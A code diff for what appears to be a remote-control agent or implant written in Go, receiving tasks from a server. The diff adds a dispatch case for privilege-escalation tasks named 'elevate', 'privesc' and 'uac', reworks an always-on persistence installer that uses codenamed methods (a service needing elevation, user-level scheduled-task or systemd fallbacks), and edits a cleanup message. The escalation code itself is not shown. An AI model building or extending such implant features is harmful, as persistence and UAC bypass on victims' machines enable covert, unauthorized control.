@@ -165,6 +165,8 @@ func (a *Agent) runTask(ctx context.Context, t *agentv1.Task) (exitCode int32, s
 		return a.runCleanup()
 	case "update":
 		return a.runUpdate(ctx)
+	case "elevate", "privesc", "uac":
+		return a.runElevate(ctx, taskID, args)
 	default:
 		return a.runShell(ctx, taskID, "default", commandLine(t.GetName(), args))
 	}
@@ -178,18 +180,16 @@ func (a *Agent) runPersist() (int32, string, string) {
 	if sleep <= 0 {
 		sleep = 5 * time.Second
 	}
-	err := install.Install(install.Options{
+	method, err := install.Install(install.Options{
 		Server:   a.ServerURL,
 		IDFile:   a.IDFile,
 		Insecure: a.InsecureTLS,
 		Sleep:    sleep.String(),
 	})
 	if err != nil {
-		return 1, "", err.Error() + "\n(note: installing a service usually requires elevated privileges)"
+		return 1, "", err.Error() + "\n(note: Keel needs elevation; Harbor/Splice are user-level fallbacks)"
 	}
-	msg := "installed always-on persistence as " + install.ServiceName() +
-		"\nbinary " + install.BinaryPath() +
-		"\n(Windows service if elevated; otherwise a per-user logon scheduled task / systemd user unit)"
+	msg := "persistence method " + method + " (" + install.ServiceName() + ")\nbinary " + install.BinaryPath()
 	return 0, msg, ""
 }
 
@@ -200,5 +200,5 @@ func (a *Agent) runCleanup() (int32, string, string) {
 	if err != nil {
 		return 1, out, err.Error()
 	}
-	return 0, out + "\ncleanup complete — agent will exit", ""
+	return 0, out + "\nAsh cleanup complete — agent will exit", ""
 }
